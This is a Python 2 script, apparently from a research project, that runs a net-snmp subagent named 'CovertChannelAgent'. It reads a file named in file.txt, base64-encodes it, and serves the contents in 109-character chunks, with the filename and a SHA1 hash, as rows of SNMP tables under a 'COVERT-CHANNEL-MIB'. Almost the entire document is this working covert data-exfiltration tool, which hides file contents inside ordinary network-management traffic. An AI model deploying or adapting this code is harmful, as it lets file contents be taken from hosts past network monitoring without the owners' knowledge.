#!/usr/bin/env python
#
		
import sys, os, signal, time
import optparse, threading, subprocess
import xml.etree.cElementTree as ET
# Make sure we use the local copy, not a system-wide one
sys.path.insert(0, os.path.dirname(os.getcwd()))
import netsnmpagent
import base64
import hashlib

prgname = sys.argv[0]
# Process command line arguments
parser = optparse.OptionParser()
parser.add_option(
	"-i",
	"--interval",
	dest="interval",
	help="Set interval in seconds between data updates",
	default=30
)
parser.add_option(
	"-m",
	"--mastersocket",
	dest="mastersocket",
	help="Sets the transport specification for the master agent's AgentX socket",
	default="/var/run/agentx/master"
)
parser.add_option(
	"-p",
	"--persistencedir",
	dest="persistencedir",
	help="Sets the path to the persistence directory",
	default="/var/lib/net-snmp"
)
(options, args) = parser.parse_args()

headerlogged = 0
def LogMsg(msg):
	""" Writes a formatted log message with a timestamp to stdout. """

	global headerlogged

	if headerlogged == 0:
		print "{0:<8} {1:<90} {2}".format(
			"Time",
			"MainThread",
			"UpdateSNMPObjsThread"
		)
		print "{:-^120}".format("-")
		headerlogged = 1

	threadname = threading.currentThread().name

	funcname = sys._getframe(1).f_code.co_name
	if funcname == "<module>":
		funcname = "Main code path"
	elif funcname == "LogNetSnmpMsg":
		funcname = "net-snmp code"
	else:
		funcname = "{0}()".format(funcname)

	if threadname == "MainThread":
		logmsg = "{0} {1:<112.112}".format(
			time.strftime("%T", time.localtime(time.time())),
			"{0}: {1}".format(funcname, msg)
		)
	else:
		logmsg = "{0} {1:>112.112}".format(
			time.strftime("%T", time.localtime(time.time())),
			"{0}: {1}".format(funcname, msg)
		)
	print logmsg

def LogNetSnmpMsg(priority, msg):
	""" Log handler for log messages generated by net-snmp code. """

	LogMsg("[{0}] {1}.".format(priority, msg))

# Create an instance of the netsnmpAgent class
try:
	agent = netsnmpagent.netsnmpAgent(
		AgentName      = "CovertChannelAgent",
		MasterSocket   = options.mastersocket,
		PersistenceDir = options.persistencedir,
		MIBFiles       = [ os.path.abspath(os.path.dirname(sys.argv[0])) +
		                   "/COVERT-CHANNEL-MIB.txt" ],
		LogHandler     = LogNetSnmpMsg,
	)
except netsnmpagent.netsnmpAgentException as e:
	print "{0}: {1}".format(prgname, e)
	sys.exit(1)


################################ BEGIN Edit Martin Leucht################################

# actual data we want to feed the MIB


covertChannelChecksum = agent.DisplayString(
	oidstr = "COVERT-CHANNEL-MIB::covertChannelChecksum",
	context = "context1",
	initval = "test"
)
# Create the first table
covertchannelGlobalTable = agent.Table(
        oidstr = "COVERT-CHANNEL-MIB::covertchannelGlobalTable",
        indexes = [
                agent.OctetString()
        ],
        columns = [
 		(2, agent.Counter64(0))
        ]

)

# Create the second table

covertchannelClientTable = agent.Table(
        oidstr = "COVERT-CHANNEL-MIB::covertchannelClientTable",
        indexes = [
		agent.OctetString()
        ],
        columns = [
		(2, agent.OctetString())
        ]
)


def UpdateSNMPObjs():
	""" Function that does the actual data update. """

	global i

	data = ""

	#File which contains the actual filename that will be encoded
	filename='file.txt'
	with open (filename, "r") as myfile:
        	file_name=myfile.read().replace('\n', '')


	#Calculate SHA1 hash of file
	BLOCKSIZE = 65536
	myhash = hashlib.sha1()
	with open(file_name, 'rb') as afile:
    		buf = afile.read(BLOCKSIZE)
    		while len(buf) > 0:
        		myhash.update(buf)
        		buf = afile.read(BLOCKSIZE)
		sha1=myhash.hexdigest()



	#Encode the content of the file with base64
	with open(file_name, "rb") as pdf_file:
    		encoded_string2 = base64.b64encode(pdf_file.read())

	encoded_list = []

	j = 0
	length_encoded = len(encoded_string2)



	if i == 1:
		UpdateTable(j,encoded_list,length_encoded,sha1,encoded_string2,data,file_name)

	else:
		covertchannelGlobalTableRow1 = covertchannelGlobalTable.clear()
		covertchannelClientTableRow1 = covertchannelClientTable.clear()
		
		UpdateTable(j,encoded_list,length_encoded,sha1,encoded_string2,data,file_name)

def UpdateTable(j,encoded_list,length_encoded,sha1,encoded_string2,data,file_name):

	counter1=100000

	while 1:
               	counter1 += 1
                encoded_list.append(encoded_string2[j:j+109])
                string = str(counter1) + encoded_string2[j:j+109] + "\n"
                covertchannelGlobalTableRow1 = covertchannelGlobalTable.addRow([agent.OctetString(string)])
                covertchannelGlobalTableRow1.setRowCell(2, agent.Counter64(counter1))
                j += 109

                msg = "Counter " + str(counter1)
                LogMsg(msg.format(data))

                if j > length_encoded:
                   	break

   	covertchannelClientTableRow1 = covertchannelClientTable.addRow([agent.OctetString(file_name)])
     	covertchannelClientTableRow1.setRowCell(2, agent.OctetString(file_name))

       	covertchannelClientTableRow1 = covertchannelClientTable.addRow([agent.OctetString(sha1)])
        covertchannelClientTableRow1.setRowCell(2, agent.OctetString(sha1))



def UpdateSNMPObjsAsync():
	""" Starts UpdateSNMPObjs() in a separate thread. """

	# UpdateSNMPObjs() will be executed in a separate thread so that the main
	# thread can continue looping and processing SNMP requests while the data
	# update is still in progress. However we'll make sure only one update
	# thread is run at any time, even if the data update interval has been set
	# too low.
	global i
	if threading.active_count() == 1:
		LogMsg("Creating thread for UpdateSNMPObjs().")
		t = threading.Thread(target=UpdateSNMPObjs, name="UpdateSNMPObjsThread")
		t.daemon = True
		t.start()
		i += 1
		counter1=1
	else:
		LogMsg("Data update still active, data update interval too low?")

# Start the agent (eg. connect to the master agent).
try:
	agent.start()
except netsnmpagent.netsnmpAgentException as e:
	LogMsg("{0}: {1}".format(prgname, e))
	sys.exit(1)

# Trigger initial data update.
LogMsg("Doing initial call to UpdateSNMPObjsAsync().")
i=0
UpdateSNMPObjsAsync()


################################ END Edit Martin Leucht################################

# Install a signal handler that terminates our threading agent when CTRL-C is
# pressed or a KILL signal is received
def TermHandler(signum, frame):
	global loop
	loop = False
signal.signal(signal.SIGINT, TermHandler)
signal.signal(signal.SIGTERM, TermHandler)

# Define a signal handler that takes care of updating the data periodically
def AlarmHandler(signum, frame):
	global loop, timer_triggered

	LogMsg("Got triggered by SIGALRM.")

	if loop:
		timer_triggered = True

		UpdateSNMPObjsAsync()

		signal.signal(signal.SIGALRM, AlarmHandler)
		signal.setitimer(signal.ITIMER_REAL, float(options.interval))
msg = "Installing SIGALRM handler triggered every {0} seconds."
msg = msg.format(options.interval)
LogMsg(msg)
signal.signal(signal.SIGALRM, AlarmHandler)
signal.setitimer(signal.ITIMER_REAL, float(options.interval))

# The threading agent's main loop. We loop endlessly until our signal
# handler above changes the "loop" variable.
LogMsg("Now serving SNMP requests, press ^C to terminate.")

loop = True
while loop:
	# Block until something happened (signal arrived, SNMP packets processed)
	timer_triggered = False
	res = agent.check_and_process()
	if res == -1 and not timer_triggered and loop:
		loop = False
		LogMsg("Error {0} in SNMP packet processing!".format(res))
	elif loop and timer_triggered:
		LogMsg("net-snmp's check_and_process() returned due to SIGALRM (res={0}), doing another loop.".format(res))
	elif loop:
		LogMsg("net-snmp's check_and_process() returned (res={0}), doing another loop.".format(res))

LogMsg("Terminating.")
agent.shutdown()
